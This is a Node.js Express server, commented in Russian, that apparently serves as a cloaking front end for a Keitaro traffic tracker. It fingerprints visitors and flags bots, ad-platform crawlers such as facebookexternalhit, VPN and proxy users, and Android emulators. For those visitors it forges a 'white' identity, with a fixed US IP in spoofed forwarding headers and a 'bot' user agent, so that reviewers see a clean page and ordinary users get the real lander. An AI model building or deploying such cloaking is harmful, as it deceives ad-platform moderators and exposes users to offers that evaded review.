import express from "express";
import crypto from "crypto";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", true);
app.use(express.json());

// === CORS ===
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, X-Req-Id, X-Request-Id, X-Correlation-Id, X-Forwarded-For, X-Real-IP, X-Forwarded-Proto, X-Forwarded-Host"
  );
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

// === URLs ===
const KEITARO_URL =
  process.env.KEITARO_URL || "https://origin.skytalonsacademy.lol/skytalonsplaying";

// === Helpers ===
function normalizeIp(ip) {
  if (!ip) return "";
  return String(ip).replace(/^::ffff:/, "").trim();
}

function detectClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) {
    const first = String(xff).split(",")[0].trim();
    if (first) return normalizeIp(first);
  }
  if (req.ip) return normalizeIp(req.ip);
  const remote = req.socket?.remoteAddress || "";
  return normalizeIp(remote);
}

function genReqId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return crypto.randomBytes(16).toString("hex");
}

// === Cache + Logging ===
const ipCache = new Map();
const logDir = path.join(process.cwd(), "logs");
if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
const logPath = path.join(logDir, "blocked.log");

function logFlag(reason, ip, ua) {
  const line = `[${new Date().toISOString()}] [${reason}] IP=${ip} UA=${ua}\n`;
  fs.appendFile(logPath, line, (err) => {
    if (err) console.error("Failed to write log:", err);
  });
}

// === Proxy / VPN detection ===
async function isProxyOrVPN(ip) {
  if (!ip) return false;
  const cached = ipCache.get(ip);
  if (cached && typeof cached === "object" && "isProxy" in cached) {
    return cached.isProxy;
  }

  let result = false;
  try {
    const resp = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
    const data = await resp.json();
    const info = data[ip];
    result =
      info?.proxy === "yes" || info?.type === "VPN" || info?.type === "Hosting";
  } catch {
    result = false; // fail-open
  }

  ipCache.set(ip, {
    ...(cached || {}),
    isProxy: result,
    last: Date.now(),
    count: cached?.count ?? 0,
  });
  return result;
}

// === Main Guard Middleware ===
// НИКОГО не режем: только помечаем как suspicious -> на этапе запроса в Keitaro подменяем IP/UA
async function guard(req, res, next) {
  const ip = detectClientIp(req);
  const uaRaw = req.headers["user-agent"] || "";
  const ua = uaRaw.toLowerCase();

  req.suspicious = false;
  req.suspiciousReason = "";

  // 1) Боты (точечно)
  const botPatterns = [
    /bot/i,
    /spider/i,
    /crawl/i,
    /headless/i,
    /render\s?bot/i,
    /monitor/i,
    /curl/i,
    /wget/i,
    /pingdom/i,
    /uptime/i,
    /facebookexternalhit/i,
    /python-requests/i,
    /node-fetch/i,
    /httpclient/i,
    /postmanruntime/i,
    /cf-network/i,
    /datadog/i,
    /newrelic/i,
  ];
  if (!ua || botPatterns.some((p) => p.test(ua))) {
    req.suspicious = true;
    req.suspiciousReason = "bot";
    logFlag("BOT->WHITE", ip, uaRaw);
  }

  // 2) VPN / Proxy
  const isProxy = await isProxyOrVPN(ip);
  if (isProxy && !req.suspicious) {
    req.suspicious = true;
    req.suspiciousReason = "vpn_proxy";
    logFlag("VPN/PROXY->WHITE", ip, uaRaw);
  }


  // 3) Эмуляторы (сузенные сигнатуры + комбо-правила)
  const isAndroid = /android/.test(ua);
  const strongEmu = [
    /sdk_gphone/i,
    /google_sdk/i,
    /android sdk built for/i,
    /genymotion/i,
    /bluestacks/i,
    /noxplayer|nox/i,
    /ldplayer/i,
    /memu/i,
    /mumu/i,
    /virtualbox|vbox/i,
    /\bemulator\b/i,
    /arc ?hon/i,
  ];
  const weakX86 = /(x86_64|i686|amd64)/i.test(ua);
  const knownRealBrands =
    /(pixel|samsung|sm-|huawei|honor|xiaomi|redmi|oneplus|oppo|vivo|sony|xperia|motorola|moto|nokia|nothing|realme|lenovo|tecno|infinix)/i;

  const matchesStrong = strongEmu.some((p) => p.test(ua));
  const matchesWeakCombo = isAndroid && weakX86 && !knownRealBrands.test(ua);

  if ((matchesStrong || matchesWeakCombo) && !req.suspicious) {
    req.suspicious = true;
    req.suspiciousReason = "emulator";
    logFlag("EMULATOR->WHITE", ip, uaRaw);
  }

  // 4) Rate limit -> mark suspicious
  const now = Date.now();
  const cached = ipCache.get(ip) || { last: 0, count: 0, isProxy: false };
  if (now - cached.last < 2000) cached.count++;
  else cached.count = 1;
  cached.last = now;
  ipCache.set(ip, cached);

  if (cached.count > 5 && !req.suspicious) {
    req.suspicious = true;
    req.suspiciousReason = "rate_limit";
    logFlag("RATE_LIMIT->WHITE", ip, uaRaw);
  }

  next();
}

// === MAIN ENDPOINT ===
app.get("/", guard, async (req, res) => {
  try {
    const realClientIp = detectClientIp(req);

    // --- если подозрительный — готовим "white-персону" ---
    const whiteUSIp =
      process.env.WHITE_US_IP || "23.239.11.1"; // любой стабильный US-IP
    const whiteUaMode = (process.env.WHITE_UA_MODE || "suffix").toLowerCase(); // 'empty' | 'suffix'
    const origUA = req.headers["user-agent"] || "";

    const uaToSend =
      req.suspicious && whiteUaMode === "empty"
        ? ""
        : req.suspicious
        ? (origUA ? `${origUA} bot` : "bot")
        : origUA;

    const clientIpToSend = req.suspicious ? whiteUSIp : realClientIp;

    // соберём цепочку XFF так, чтобы первым был нужный IP
    const incomingXFF = req.headers["x-forwarded-for"] || "";
    const incomingParts = String(incomingXFF)
      .split(",")
      .map((p) => p.trim())
      .filter(Boolean);
    const outgoingParts = [
      clientIpToSend,
      ...incomingParts.filter(
        (ip) => ip !== clientIpToSend && ip !== "unknown"
      ),
    ].filter(Boolean);
    const outgoingXFF = outgoingParts.join(", ");

    const reqId =
      req.headers["x-req-id"] ||
      req.headers["x-request-id"] ||
      req.headers["x-correlation-id"] ||
      genReqId();

    const forwardedProto =
      req.headers["x-forwarded-proto"] ||
      req.protocol ||
      (req.secure ? "https" : "http");
    const forwardedHost =
      req.headers["x-forwarded-host"] || req.headers.host || "";

    // --- заголовки к Keitaro: для подозрительных — IP США + UA пустой/с bot ---
    const fetchHeaders = {
      "User-Agent": uaToSend,
      "Accept-Language": req.headers["accept-language"] || "en-US,en;q=0.9",
      Accept: req.headers["accept"] || "*/*",
      "X-Forwarded-For": outgoingXFF,
      "CF-Connecting-IP": clientIpToSend,
      "True-Client-IP": clientIpToSend,
      "X-Real-IP": clientIpToSend,
      "X-Forwarded-Proto": forwardedProto,
      "X-Forwarded-Host": forwardedHost,
      "X-Req-Id": reqId,
    };

    const response = await fetch(KEITARO_URL, {
      redirect: "follow",
      headers: fetchHeaders,
    });

    // редирект — отдадим прямую ссылку (site_url)
    if (response.url && response.url !== KEITARO_URL) {
      return res.json({
        image_url: "",
        site_url: response.url,
      });
    }


    // иначе Keitaro вернул HTML — парсим первую <img>
    const html = await response.text();
    let imageUrl = "";
    const imgIndex = html.indexOf("<img");
    if (imgIndex !== -1) {
      const srcIndex = html.indexOf("src=", imgIndex);
      if (srcIndex !== -1) {
        const startQuote = html[srcIndex + 4];
        const endQuote = html.indexOf(startQuote, srcIndex + 5);
        imageUrl = html.substring(srcIndex + 5, endQuote).trim();

        const LANDER_NAME = "skytalons";
        if (imageUrl && !/^https?:\/\//i.test(imageUrl)) {
          try {
            const baseUrl = new URL(KEITARO_URL);
            imageUrl = `${baseUrl.origin}/lander/${LANDER_NAME}/${imageUrl.replace(
              /^\/+/,
              ""
            )}`;
          } catch (e) {
            console.error("Failed to build absolute URL:", e);
          }
        }
      }
    }

    return res.json({
      image_url: imageUrl || "",
      site_url: "",
    });
  } catch (err) {
    console.error("Error:", err);
    // fail-safe: пустые поля (структура та же)
    return res.json({
      image_url: "",
      site_url: "",
    });
  }
});

// === SERVER START ===
app.listen(PORT, () => {
  console.log("✅ API running on port", PORT);
});
